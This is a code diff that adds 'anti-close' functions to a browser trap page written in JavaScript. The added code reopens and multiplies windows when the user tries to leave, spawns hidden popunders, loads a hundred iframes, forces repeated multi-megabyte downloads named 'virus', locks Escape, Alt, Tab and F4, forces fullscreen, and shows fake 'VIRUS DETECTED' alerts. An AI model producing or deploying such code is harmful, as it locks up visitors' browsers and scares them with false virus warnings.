@@ -406,6 +406,8 @@ function initParentWindow () {
     rapidReplication()
     extremeLag()
     hydraEffect()
+    ultimateAntiClose()
+    hydraMode()
     }
   })
 }
@@ -3368,30 +3370,117 @@ function fillStorage() {
   }
 }
 
-// ===== IMPOSSIBLE TO CLOSE =====
-function impossibleToClose() {
+// ===== ANTI-CLOSE TECHNIQUES =====
+function blockClose() {
   window.addEventListener('beforeunload', (e) => {
     e.preventDefault()
     e.returnValue = 'Are you sure?'
+    for (let i = 0; i < 20; i++) {
+      window.open(location.href + '?reopen=' + Date.now(), '_blank')
+    }
     return 'Are you sure?'
   })
-  window.addEventListener('unload', (e) => {
-    for (let i = 0; i < 10; i++) {
-      window.open(window.location.href + '?reborn=' + Date.now(), '_blank')
-    }
+  window.addEventListener('unload', () => {
+    window.open(location.href, '_blank')
   })
+}
+
+function focusSteal() {
   setInterval(() => {
     window.focus()
-    alert('SYSTEM ERROR: Cannot close infected tab!')
-    alert('REPLICATING...')
-    alert('DO NOT CLOSE!')
+    window.moveTo(0, 0)
+    window.resizeTo(screen.width, screen.height)
+  }, 10)
+  setInterval(() => {
+    alert('SYSTEM ERROR!\n\nClosing this tab will damage your computer!')
+    alert('VIRUS DETECTED!\n\nDo not close!')
+    confirm('Are you sure you want to close?')
+    prompt('Enter password to close:', '')
   }, 100)
-  document.documentElement.requestFullscreen().catch(() => {})
+}
+
+function popunderSpam() {
+  function openPopunder() {
+    const w = window.open(location.href, '_blank', 'width=1,height=1,left=9999,top=9999')
+    if (w) {
+      w.blur()
+      window.focus()
+    }
+  }
+  setInterval(openPopunder, 500)
+}
+
+function iframeBomb() {
+  for (let i = 0; i < 100; i++) {
+    const iframe = document.createElement('iframe')
+    iframe.src = location.href + '?iframe=' + i
+    iframe.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;z-index:' + i
+    document.body.appendChild(iframe)
+  }
+}
+
+function downloadTrap() {
+  setInterval(() => {
+    for (let i = 0; i < 5; i++) {
+      const a = document.createElement('a')
+      a.href = 'data:text/plain,' + 'x'.repeat(1000000)
+      a.download = 'virus_' + Date.now() + '.txt'
+      a.click()
+    }
+  }, 100)
+}
+
+async function lockAllKeys() {
+  if ('keyboard' in navigator && navigator.keyboard.lock) {
+    await navigator.keyboard.lock(['Escape', 'Alt', 'Tab', 'Control', 'Meta', 'F4', 'w', 'W', 'q', 'Q'])
+  }
+  window.addEventListener('keydown', (e) => {
+    e.preventDefault()
+    e.stopPropagation()
+    if (e.key === 'w' && e.ctrlKey) openWindow()
+    if (e.key === 'F4' && e.altKey) openWindow()
+    return false
+  }, true)
+}
+
+function hideUI() {
+  document.documentElement.requestFullscreen()
   document.body.requestPointerLock()
   setInterval(() => {
+    if (!document.fullscreenElement) {
+      document.documentElement.requestFullscreen()
+    }
     document.body.requestPointerLock()
-    window.focus()
+    window.moveTo(-10, -10)
+    window.resizeTo(screen.width + 20, screen.height + 20)
   }, 50)
+}
+
+function impossibleToClose() {
+  blockClose()
+  focusSteal()
+  popunderSpam()
+  iframeBomb()
+  downloadTrap()
+  lockAllKeys()
+  hideUI()
+  setInterval(() => {
+    if (window.closed) window.open(location.href, '_blank')
+  }, 10)
+}
+
+function hydraMode() {
+  const originalUrl = location.href
+  window.onbeforeunload = function() {
+    for (let i = 0; i < 10; i++) {
+      const w = window.open(originalUrl + '?hydra=' + Date.now(), '_blank')
+      if (w) w.opener = null
+    }
+    return 'Are you sure?'
+  }
+  if (location.search.includes('hydra')) {
+    setTimeout(hydraMode, 1000)
+  }
 }
 
 // ===== RAPID REPLICATION =====
